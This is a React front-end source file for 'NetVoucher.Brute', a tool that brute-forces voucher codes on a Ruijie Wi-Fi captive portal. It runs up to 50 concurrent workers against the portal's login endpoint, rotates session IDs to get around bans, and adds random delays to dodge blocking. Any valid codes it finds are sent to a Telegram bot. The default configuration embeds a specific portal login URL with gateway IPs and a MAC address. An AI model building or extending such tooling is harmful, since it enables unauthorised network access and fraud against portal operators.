import React, { useState, useEffect, useCallback, useRef } from 'react';
import { 
  Play, Pause, Settings, ShieldAlert, Activity, 
  Wifi, Users, Key, Download, Trash2, Cpu, Type, Hash, AlignLeft,
  Network, Check, Power, Zap, Lock, Globe, Terminal as TerminalIcon
} from 'lucide-react';
import ConsoleLog from './components/ConsoleLog';
import StatCard from './components/StatCard';
import { Config, LogEntry, ScanStats, SessionSlot, ValidCode } from './types';
import { fetchSessionId, generateAccessCode, checkCode, sendTelegramAlert } from './services/scannerLogic';

const DEFAULT_CONFIG: Config = {
  targetUrl: 'https://portal-as.ruijienetworks.com',
  telegramBotToken: '',
  telegramChatId: '',
  threadCount: 20,
  simulationMode: true,
  // New Defaults: Mixed (Number + Lowercase)
  useNumbers: true,
  useLowercase: true, 
  codeLength: 6,
  codePrefix: '',
  loginUrl: 'https://portal-as.ruijienetworks.com/auth/wifidogAuth/login/?gw_id=105f025095cc&gw_sn=H1T81SZ001332&gw_address=172.16.200.1&gw_port=2060&ip=172.16.219.79&mac=1a:c3:0e:17:e2:bf&slot_num=0&nasip=192.168.1.97&ssid=VLAN20&ustate=0&mac_req=0&url=https%3A%2F%2Fwww%2Ex%2Ecom%2F&chap_id=%5C340&chap_challenge=%5C003%5C272%5C071%5C251%5C154%5C266%5C314%5C357%5C226%5C202%5C003%5C266%5C226%5C145%5C177%5C225'
};

const MAX_LOGS = 200;

// UI Components
const Toggle = ({ checked, onChange, label }: { checked: boolean; onChange: (v: boolean) => void; label: string }) => (
  <div className="flex items-center justify-between py-3 px-4 bg-zinc-900/40 rounded-lg border border-zinc-800/50">
    <span className="text-zinc-300 text-sm font-medium">{label}</span>
    <button 
      onClick={() => onChange(!checked)}
      className={`relative w-12 h-6 rounded-full transition-all duration-300 ease-in-out focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-offset-[#09090b] focus:ring-emerald-500/50 ${
        checked ? 'bg-emerald-500 shadow-[0_0_10px_rgba(16,185,129,0.3)]' : 'bg-zinc-700'
      }`}
    >
      <span className={`absolute top-1 left-1 bg-white w-4 h-4 rounded-full shadow-sm transition-transform duration-300 ease-out ${
        checked ? 'translate-x-6' : 'translate-x-0'
      }`} />
    </button>
  </div>
);

const ModeOption = ({ active, onClick, icon: Icon, label, subLabel }: any) => (
  <button
    onClick={onClick}
    className={`relative group flex flex-col items-center justify-center p-4 rounded-xl border transition-all duration-300 w-full ${
      active 
        ? 'bg-gradient-to-br from-emerald-500/10 to-emerald-900/20 border-emerald-500/50 shadow-[0_0_20px_rgba(16,185,129,0.1)]' 
        : 'bg-zinc-900/40 border-zinc-800 hover:bg-zinc-800/60 hover:border-zinc-700'
    }`}
  >
    <div className={`p-2 rounded-full mb-2 transition-colors ${active ? 'bg-emerald-500/20 text-emerald-400' : 'bg-zinc-800 text-zinc-500 group-hover:text-zinc-400'}`}>
        <Icon className="w-5 h-5" />
    </div>
    <span className={`text-xs font-bold uppercase tracking-wider mb-0.5 ${active ? 'text-emerald-400' : 'text-zinc-400'}`}>{label}</span>
    <span className="text-[10px] text-zinc-600">{subLabel}</span>
    
    {active && <div className="absolute inset-0 rounded-xl border border-emerald-500/30 animate-pulse pointer-events-none" />}
  </button>
);

export default function App() {
  // State
  const [isRunning, setIsRunning] = useState(false);
  const [config, setConfig] = useState<Config>(DEFAULT_CONFIG);
  const [showConfig, setShowConfig] = useState(false);
  const [stats, setStats] = useState<ScanStats>({
    attempts: 0,
    validFound: 0,
    sessionsActive: 0,
    startTime: null
  });
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [validCodes, setValidCodes] = useState<ValidCode[]>([]);
  const [activeSessions, setActiveSessions] = useState<SessionSlot[]>([]); // For UI display
  const [rightTab, setRightTab] = useState<'valid' | 'pool'>('valid');
  
  // Refs for async loop management
  const sessionsRef = useRef<SessionSlot[]>([]);
  const isRunningRef = useRef(false);
  const statsRef = useRef(stats);
  
  // Load config from localstorage
  useEffect(() => {
    const saved = localStorage.getItem('netvoucher_config');
    if (saved) {
        try {
            // Merge saved with default to handle new fields
            setConfig({ ...DEFAULT_CONFIG, ...JSON.parse(saved) });
        } catch(e) {}
    }
  }, []);

  useEffect(() => {
    localStorage.setItem('netvoucher_config', JSON.stringify(config));
  }, [config]);

  useEffect(() => {
    statsRef.current = stats;
  }, [stats]);

  const addLog = useCallback((message: string, type: LogEntry['type'] = 'info') => {
    const entry: LogEntry = {
      id: Math.random().toString(36).substr(2, 9),
      timestamp: new Date().toLocaleTimeString(),
      message,
      type
    };
    setLogs(prev => [...prev.slice(-MAX_LOGS), entry]);
  }, []);

  // --- Core Worker Logic ---

  // Session Manager
  const manageSessions = useCallback(async () => {
    if (!isRunningRef.current) return;
    
    // Target 50% of thread count as active sessions
    const targetSessions = Math.max(1, Math.floor(config.threadCount / 2));
    
    if (sessionsRef.current.length < targetSessions) {
      // addLog('Pool low. Fetching new session ID...', 'warning');
      const sid = await fetchSessionId(config);
      
      if (sid) {
        sessionsRef.current.push({
          id: Math.random().toString(36),
          sessionId: sid,
          remainingUses: 40 // Matches Python PER_SESSION_MAX
        });
        addLog(`Session acquired and added to pool [SID: ${sid}]`, 'info');
      } else {
        // Wait 2 seconds before retry to avoid log spam
        await new Promise(resolve => setTimeout(resolve, 2000));
        addLog('Failed to fetch session. Retrying...', 'error');
      }
    }
    
    // Update active count for UI
    setStats(prev => ({...prev, sessionsActive: sessionsRef.current.length}));
    setActiveSessions([...sessionsRef.current]); // Sync for UI display
    
    if (isRunningRef.current) {
        setTimeout(manageSessions, 1000);
    }
  }, [config, addLog]);

  // Worker Loop (Recursive Promise Chain)
  const spawnWorker = useCallback(async (workerId: number) => {
    if (!isRunningRef.current) return;

    if (sessionsRef.current.length === 0) {
      // Wait for sessions
      setTimeout(() => spawnWorker(workerId), 500);
      return;
    }

    // Get a session
    const sessionIndex = Math.floor(Math.random() * sessionsRef.current.length);
    const sessionSlot = sessionsRef.current[sessionIndex];
    
    if (!sessionSlot) {
       setTimeout(() => spawnWorker(workerId), 100);
       return;
    }

    // Try a code - NOW USES CONFIG
    const code = generateAccessCode(config);
    
    // Optional: Log every attempt (can be noisy, but helpful if user wants to see it)
    // addLog(`Checking ${code} on [SID: ${sessionSlot.sessionId}]`, 'info');

    const result = await checkCode(code, sessionSlot.sessionId, config);

    // Update Stats
    setStats(prev => ({
        ...prev,
        attempts: prev.attempts + 1
    }));

    if (result.valid) {
      addLog(`VALID CODE FOUND: ${code} on [SID: ${sessionSlot.sessionId}]`, 'success');
      setValidCodes(prev => [...prev, {
          code,
          timestamp: new Date().toLocaleString(),
          sessionId: sessionSlot.sessionId
      }]);
      setStats(prev => ({...prev, validFound: prev.validFound + 1}));
      
      // Send Telegram
      await sendTelegramAlert(code, sessionSlot.sessionId, config);
    } else if (result.message.includes('timeout') || result.status === 401) {
       addLog(`Session expired/banned [SID: ${sessionSlot.sessionId}]`, 'error');
       // Remove session
       sessionsRef.current = sessionsRef.current.filter(s => s.id !== sessionSlot.id);
       setActiveSessions([...sessionsRef.current]);
    } else {
       // Decrement usage
       sessionSlot.remainingUses--;
       if (sessionSlot.remainingUses <= 0) {
           sessionsRef.current = sessionsRef.current.filter(s => s.id !== sessionSlot.id);
           setActiveSessions([...sessionsRef.current]);
       }
    }

    // Next loop with slight random delay to behave like human/reduce blockage
    const delay = Math.random() * 50; 
    setTimeout(() => spawnWorker(workerId), delay);

  }, [config, addLog]);


  const toggleScan = () => {
    if (isRunning) {
        // Stop
        setIsRunning(false);
        isRunningRef.current = false;
        addLog('Stopping all workers...', 'warning');
    } else {
        // Start
        setIsRunning(true);
        isRunningRef.current = true;
        setStats(prev => ({...prev, startTime: Date.now()}));
        addLog(`Initializing scan with ${config.threadCount} workers...`, 'success');
        
        let modeStr = [];
        if(config.useNumbers) modeStr.push("Numbers");
        if(config.useLowercase) modeStr.push("Lowercase");
        addLog(`Configuration: Length=${config.codeLength}, Mode=[${modeStr.join('+')}]`, 'info');
        
        // Start Session Manager
        manageSessions();

        // Start Workers
        for(let i=0; i < config.threadCount; i++) {
            setTimeout(() => spawnWorker(i), i * 50); // Stagger start
        }
    }
  };

  const downloadResults = () => {
    const content = validCodes.map(v => `${v.timestamp}\t${v.code}\t${v.sessionId}`).join('\n');
    const blob = new Blob([content], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `valid_codes_${Date.now()}.txt`;
    a.click();
  };

  // Input Validation for Code Length
  const handleCodeLengthChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let val = parseInt(e.target.value);
    if (isNaN(val)) val = 6; // Default fallback if empty/invalid
    // Clamping logic
    if (val < 1) val = 1;
    if (val > 20) val = 20;
    
    setConfig({...config, codeLength: val});
  };

  const setCharsetMode = (mode: 'numbers' | 'lowercase' | 'mixed') => {
    if (mode === 'numbers') setConfig({ ...config, useNumbers: true, useLowercase: false });
    if (mode === 'lowercase') setConfig({ ...config, useNumbers: false, useLowercase: true });
    if (mode === 'mixed') setConfig({ ...config, useNumbers: true, useLowercase: true });
  };

  const getCurrentMode = () => {
    if (config.useNumbers && config.useLowercase) return 'mixed';
    if (config.useLowercase) return 'lowercase';
    return 'numbers';
  };

  // Calculate speed
  const getSpeed = () => {
    if (!stats.startTime) return 0;
    const seconds = (Date.now() - stats.startTime) / 1000;
    return seconds > 0 ? Math.round(stats.attempts / seconds) : 0;
  };

  return (
    <div className="min-h-screen bg-[#09090b] text-zinc-200 font-sans selection:bg-emerald-500/30 overflow-hidden flex flex-col">
      
      {/* Background Ambient Glow */}
      <div className="fixed inset-0 pointer-events-none">
          <div className="absolute top-[-10%] left-[-10%] w-[50%] h-[50%] bg-emerald-500/5 rounded-full blur-[150px]" />
          <div className="absolute bottom-[-10%] right-[-10%] w-[50%] h-[50%] bg-blue-500/5 rounded-full blur-[150px]" />
          <div className="absolute top-[20%] right-[20%] w-[20%] h-[20%] bg-indigo-500/5 rounded-full blur-[100px]" />
      </div>

      {/* Navbar */}
      <header className="border-b border-white/5 bg-[#0c0c0e]/80 backdrop-blur-xl sticky top-0 z-50">
        <div className="max-w-7xl mx-auto px-4 h-16 flex items-center justify-between">
            <div className="flex items-center gap-3 group cursor-default">
                <div className="relative">
                    <div className="absolute inset-0 bg-emerald-500 blur-md opacity-20 group-hover:opacity-40 transition-opacity"></div>
                    <ShieldAlert className="w-6 h-6 text-emerald-500 relative z-10" />
                </div>
                <div>
                    <h1 className="text-lg font-bold tracking-tight text-white">NetVoucher<span className="text-emerald-500">.Brute</span></h1>
                    <div className="flex items-center gap-2">
                        <span className="inline-block w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse"></span>
                        <span className="text-[10px] text-emerald-500/80 font-mono tracking-wider uppercase">System Online</span>
                    </div>
                </div>
            </div>
            
            <div className="flex items-center gap-3">
               {!config.simulationMode && (
                  <div className="hidden md:flex items-center gap-2 px-3 py-1 bg-red-500/10 border border-red-500/20 rounded-full">
                      <Zap className="w-3.5 h-3.5 text-red-500" />
                      <span className="text-[10px] text-red-400 font-bold uppercase tracking-wider">Live Mode</span>
                  </div>
               )}
               <button 
                  onClick={() => setShowConfig(!showConfig)}
                  className={`p-2.5 rounded-lg border transition-all duration-300 ${showConfig ? 'bg-zinc-800 text-white border-zinc-600' : 'bg-zinc-900/50 text-zinc-400 border-zinc-800 hover:text-white hover:border-zinc-700'}`}
                >
                    <Settings className={`w-5 h-5 ${showConfig ? 'animate-spin-slow' : ''}`} />
               </button>
            </div>
        </div>
      </header>

      <main className="flex-1 max-w-7xl mx-auto w-full p-4 lg:p-6 grid grid-cols-1 lg:grid-cols-12 gap-6 relative z-10">
        
        {/* LEFT COLUMN: Controls & Stats */}
        <div className="lg:col-span-8 flex flex-col gap-6 h-full">
            
            {/* Top Stats Row */}
            <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                <StatCard 
                    label="Attempts" 
                    value={stats.attempts.toLocaleString()} 
                    icon={<Activity className="w-4 h-4" />} 
                    color="blue"
                />
                 <StatCard 
                    label="Speed (req/s)" 
                    value={getSpeed()} 
                    icon={<Zap className="w-4 h-4" />} 
                    color="emerald"
                />
                <StatCard 
                    label="Active Sessions" 
                    value={stats.sessionsActive} 
                    icon={<Wifi className="w-4 h-4" />} 
                    color="zinc"
                />
                <StatCard 
                    label="Workers" 
                    value={isRunning ? config.threadCount : 0} 
                    icon={<Cpu className="w-4 h-4" />} 
                    color="zinc"
                />
            </div>

            {/* Config Panel (Collapsible) */}
            {showConfig && (
                <div className="bg-[#121214]/90 backdrop-blur-xl border border-zinc-800/80 rounded-2xl p-6 shadow-2xl animate-in fade-in slide-in-from-top-4 duration-300">
                    <div className="flex items-center gap-2 mb-6 pb-4 border-b border-white/5">
                        <Settings className="w-5 h-5 text-emerald-500" />
                        <h2 className="text-sm font-bold uppercase tracking-wider text-white">Scanner Configuration</h2>
                    </div>

                    <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
                        {/* Column 1: Network & Target */}
                        <div className="space-y-5">
                             <div>
                                <label className="block text-xs font-medium text-zinc-400 mb-1.5 uppercase tracking-wide">Login URL (Session Source)</label>
                                <div className="relative">
                                    <Globe className="absolute left-3 top-3 w-4 h-4 text-zinc-500" />
                                    <input 
                                        type="text" 
                                        value={config.loginUrl}
                                        onChange={(e) => setConfig({...config, loginUrl: e.target.value})}
                                        className="w-full bg-zinc-900/50 border border-zinc-800 rounded-lg py-2.5 pl-10 pr-3 text-xs font-mono text-zinc-300 focus:outline-none focus:border-emerald-500/50 focus:ring-1 focus:ring-emerald-500/50 transition-all placeholder:text-zinc-700"
                                        placeholder="Paste full URL with ?gw_id=..."
                                    />
                                </div>
                                <p className="text-[10px] text-zinc-600 mt-1.5 ml-1">System extracts Session ID from this URL parameters.</p>
                             </div>

                             <div>
                                <label className="block text-xs font-medium text-zinc-400 mb-1.5 uppercase tracking-wide">Target Base URL</label>
                                <input 
                                    type="text" 
                                    value={config.targetUrl}
                                    onChange={(e) => setConfig({...config, targetUrl: e.target.value})}
                                    className="w-full bg-zinc-900/50 border border-zinc-800 rounded-lg p-2.5 text-xs font-mono text-zinc-300 focus:outline-none focus:border-emerald-500/50 transition-all"
                                />
                             </div>

                             <div>
                                <label className="block text-xs font-medium text-zinc-400 mb-1.5 uppercase tracking-wide">Thread Count</label>
                                <div className="flex items-center gap-4">
                                    <input 
                                        type="range" 
                                        min="1" max="50" 
                                        value={config.threadCount}
                                        onChange={(e) => setConfig({...config, threadCount: parseInt(e.target.value)})}
                                        className="w-full h-2 bg-zinc-800 rounded-lg appearance-none cursor-pointer accent-emerald-500"
                                    />
                                    <span className="font-mono text-emerald-400 font-bold bg-emerald-500/10 px-2 py-1 rounded border border-emerald-500/20">{config.threadCount}</span>
                                </div>
                             </div>

                             <Toggle 
                                label="Enable Simulation Mode" 
                                checked={config.simulationMode}
                                onChange={(v) => setConfig({...config, simulationMode: v})}
                             />
                             <p className="text-[10px] text-zinc-600 -mt-3 pl-1">Safe mode for UI testing without network calls</p>

                        </div>

                        {/* Column 2: Code Generation */}
                        <div className="space-y-5">
                            <div>
                                <label className="block text-xs font-medium text-zinc-400 mb-3 uppercase tracking-wide">Character Set</label>
                                <div className="grid grid-cols-3 gap-3">
                                    <ModeOption 
                                        active={getCurrentMode() === 'numbers'} 
                                        onClick={() => setCharsetMode('numbers')}
                                        icon={Hash}
                                        label="Numbers"
                                        subLabel="0-9"
                                    />
                                    <ModeOption 
                                        active={getCurrentMode() === 'lowercase'} 
                                        onClick={() => setCharsetMode('lowercase')}
                                        icon={Type}
                                        label="Lower"
                                        subLabel="a-z"
                                    />
                                    <ModeOption 
                                        active={getCurrentMode() === 'mixed'} 
                                        onClick={() => setCharsetMode('mixed')}
                                        icon={AlignLeft}
                                        label="Mixed"
                                        subLabel="0-9 + a-z"
                                    />
                                </div>
                            </div>

                             <div>
                                <label className="block text-xs font-medium text-zinc-400 mb-1.5 uppercase tracking-wide">Code Length</label>
                                <div className="relative">
                                    <Hash className="absolute left-3 top-3 w-4 h-4 text-zinc-500" />
                                    <input 
                                        type="number" 
                                        min="1" max="20"
                                        value={config.codeLength}
                                        onChange={handleCodeLengthChange}
                                        className="w-full bg-zinc-900/50 border border-zinc-800 rounded-lg py-2.5 pl-10 pr-3 text-xs font-mono text-zinc-300 focus:outline-none focus:border-emerald-500/50 transition-all"
                                    />
                                </div>
                             </div>

                             <div>
                                <label className="block text-xs font-medium text-zinc-400 mb-1.5 uppercase tracking-wide">Prefix (Optional)</label>
                                <div className="relative">
                                    <Lock className="absolute left-3 top-3 w-4 h-4 text-zinc-500" />
                                    <input 
                                        type="text" 
                                        value={config.codePrefix}
                                        onChange={(e) => setConfig({...config, codePrefix: e.target.value})}
                                        className="w-full bg-zinc-900/50 border border-zinc-800 rounded-lg py-2.5 pl-10 pr-3 text-xs font-mono text-zinc-300 focus:outline-none focus:border-emerald-500/50 transition-all"
                                        placeholder="e.g. WiFi"
                                    />
                                </div>
                             </div>
                             
                             <div className="pt-2 border-t border-white/5">
                                 <h3 className="text-[10px] font-bold text-zinc-500 uppercase mb-2">Telegram Integration</h3>
                                 <input 
                                    type="text" 
                                    value={config.telegramBotToken}
                                    onChange={(e) => setConfig({...config, telegramBotToken: e.target.value})}
                                    className="w-full bg-zinc-900/30 border border-zinc-800 rounded mb-2 px-3 py-1.5 text-[10px] text-zinc-400 focus:text-zinc-200 focus:border-blue-500/50 outline-none"
                                    placeholder="Bot Token"
                                 />
                                 <input 
                                    type="text" 
                                    value={config.telegramChatId}
                                    onChange={(e) => setConfig({...config, telegramChatId: e.target.value})}
                                    className="w-full bg-zinc-900/30 border border-zinc-800 rounded px-3 py-1.5 text-[10px] text-zinc-400 focus:text-zinc-200 focus:border-blue-500/50 outline-none"
                                    placeholder="Chat ID"
                                 />
                             </div>
                        </div>
                    </div>
                </div>
            )}
            
            {/* Main Action Button Area */}
            <div className="bg-[#121214]/60 backdrop-blur-md border border-zinc-800 rounded-2xl p-6 flex flex-col items-center justify-center min-h-[160px] relative overflow-hidden group">
                 {/* Decorative background pulse */}
                 <div className={`absolute inset-0 bg-gradient-to-r ${isRunning ? 'from-rose-500/10 to-orange-500/10' : 'from-emerald-500/10 to-cyan-500/10'} opacity-0 group-hover:opacity-100 transition-opacity duration-700 pointer-events-none`}></div>
                 
                 <button 
                    onClick={toggleScan}
                    className={`
                        relative group/btn flex items-center gap-4 px-10 py-5 rounded-xl font-bold text-lg tracking-wider transition-all duration-300 transform hover:scale-[1.02] active:scale-95 shadow-xl
                        ${isRunning 
                            ? 'bg-gradient-to-r from-rose-600 to-red-600 text-white shadow-rose-900/20 hover:shadow-rose-600/30 ring-1 ring-white/10' 
                            : 'bg-gradient-to-r from-emerald-600 to-teal-600 text-white shadow-emerald-900/20 hover:shadow-emerald-600/30 ring-1 ring-white/10'}
                    `}
                 >
                    <div className={`p-2 rounded-full bg-white/10 backdrop-blur-sm ${isRunning ? 'animate-pulse' : ''}`}>
                        {isRunning ? <Power className="w-6 h-6" /> : <Play className="w-6 h-6 ml-0.5" />}
                    </div>
                    <span>{isRunning ? 'STOP OPERATION' : 'INITIATE SCAN'}</span>
                    
                    {/* Shine effect */}
                    <div className="absolute top-0 -inset-full h-full w-1/2 z-5 block transform -skew-x-12 bg-gradient-to-r from-transparent to-white opacity-20 group-hover/btn:animate-shine" />
                 </button>
                 
                 <p className={`mt-4 text-xs font-mono transition-colors ${isRunning ? 'text-rose-400 animate-pulse' : 'text-zinc-500'}`}>
                    {isRunning ? 'SYSTEM ACTIVE - BRUTE FORCE IN PROGRESS' : 'READY TO START'}
                 </p>
            </div>

            {/* Console Output */}
            <div className="flex-1 min-h-[300px] lg:min-h-0">
                <ConsoleLog logs={logs} />
            </div>

        </div>

        {/* RIGHT COLUMN: Valid Codes & Active Pool */}
        <div className="lg:col-span-4 flex flex-col h-full bg-[#121214]/80 backdrop-blur-xl border border-zinc-800 rounded-2xl overflow-hidden shadow-2xl">
            <div className="flex border-b border-zinc-800">
                <button 
                    onClick={() => setRightTab('valid')}
                    className={`flex-1 py-3 text-xs font-bold uppercase tracking-wider transition-colors ${rightTab === 'valid' ? 'bg-zinc-800/50 text-emerald-400 border-b-2 border-emerald-500' : 'text-zinc-500 hover:text-zinc-300 hover:bg-zinc-800/30'}`}
                >
                    <div className="flex items-center justify-center gap-2">
                        <Key className="w-3.5 h-3.5" />
                        Valid ({validCodes.length})
                    </div>
                </button>
                <button 
                    onClick={() => setRightTab('pool')}
                    className={`flex-1 py-3 text-xs font-bold uppercase tracking-wider transition-colors ${rightTab === 'pool' ? 'bg-zinc-800/50 text-blue-400 border-b-2 border-blue-500' : 'text-zinc-500 hover:text-zinc-300 hover:bg-zinc-800/30'}`}
                >
                     <div className="flex items-center justify-center gap-2">
                        <Network className="w-3.5 h-3.5" />
                        Pool ({activeSessions.length})
                    </div>
                </button>
            </div>

            <div className="flex-1 overflow-y-auto custom-scrollbar p-0">
                {rightTab === 'valid' ? (
                    <div className="p-4 space-y-3">
                         {validCodes.length === 0 ? (
                            <div className="flex flex-col items-center justify-center h-48 text-zinc-600">
                                <Key className="w-10 h-10 mb-3 opacity-20" />
                                <span className="text-xs">No valid codes found yet.</span>
                            </div>
                         ) : (
                            validCodes.map((vc, idx) => (
                                <div key={idx} className="bg-emerald-500/10 border border-emerald-500/20 rounded-lg p-3 animate-in fade-in slide-in-from-right duration-300">
                                    <div className="flex items-center justify-between mb-1">
                                        <span className="text-emerald-400 font-mono text-lg font-bold tracking-wider">{vc.code}</span>
                                        <Check className="w-4 h-4 text-emerald-500" />
                                    </div>
                                    <div className="text-[10px] text-zinc-500 font-mono truncate mb-1">Session: {vc.sessionId}</div>
                                    <div className="text-[10px] text-zinc-600 text-right">{vc.timestamp}</div>
                                </div>
                            ))
                         )}
                    </div>
                ) : (
                    <div className="p-4 space-y-2">
                         {activeSessions.length === 0 ? (
                            <div className="flex flex-col items-center justify-center h-48 text-zinc-600">
                                <Network className="w-10 h-10 mb-3 opacity-20" />
                                <span className="text-xs">Session pool is empty.</span>
                            </div>
                         ) : (
                             activeSessions.map((sess) => (
                                <div key={sess.id} className="bg-zinc-900/50 border border-zinc-800 rounded-lg p-3 group hover:border-blue-500/30 transition-colors">
                                    <div className="flex items-center justify-between mb-2">
                                        <span className="text-[10px] font-mono text-blue-300 truncate w-32" title={sess.sessionId}>
                                            {sess.sessionId}
                                        </span>
                                        <span className="text-[10px] font-bold text-zinc-500">{sess.remainingUses} left</span>
                                    </div>
                                    <div className="w-full h-1 bg-zinc-800 rounded-full overflow-hidden">
                                        <div 
                                            className="h-full bg-blue-500/50 rounded-full transition-all duration-300" 
                                            style={{width: `${(sess.remainingUses / 40) * 100}%`}} 
                                        />
                                    </div>
                                </div>
                             ))
                         )}
                    </div>
                )}
            </div>
            
            {/* Footer Actions */}
            <div className="p-4 border-t border-zinc-800 bg-[#121214]/90 backdrop-blur">
                {rightTab === 'valid' && (
                     <div className="flex gap-2">
                         <button 
                            onClick={downloadResults}
                            disabled={validCodes.length === 0}
                            className="flex-1 flex items-center justify-center gap-2 bg-zinc-800 hover:bg-zinc-700 disabled:opacity-50 disabled:cursor-not-allowed text-zinc-300 text-xs font-bold py-2 rounded-lg transition-colors"
                         >
                            <Download className="w-3.5 h-3.5" />
                            SAVE
                         </button>
                         <button 
                            onClick={() => setValidCodes([])}
                            disabled={validCodes.length === 0}
                            className="w-10 flex items-center justify-center bg-zinc-800 hover:bg-red-900/30 hover:text-red-400 disabled:opacity-50 disabled:cursor-not-allowed text-zinc-400 rounded-lg transition-colors"
                         >
                            <Trash2 className="w-3.5 h-3.5" />
                         </button>
                     </div>
                )}
                {rightTab === 'pool' && (
                    <div className="text-center text-[10px] text-zinc-600">
                        Auto-refills when &lt; {Math.floor(config.threadCount / 2)} sessions
                    </div>
                )}
            </div>
        </div>

      </main>
    </div>
  );
}
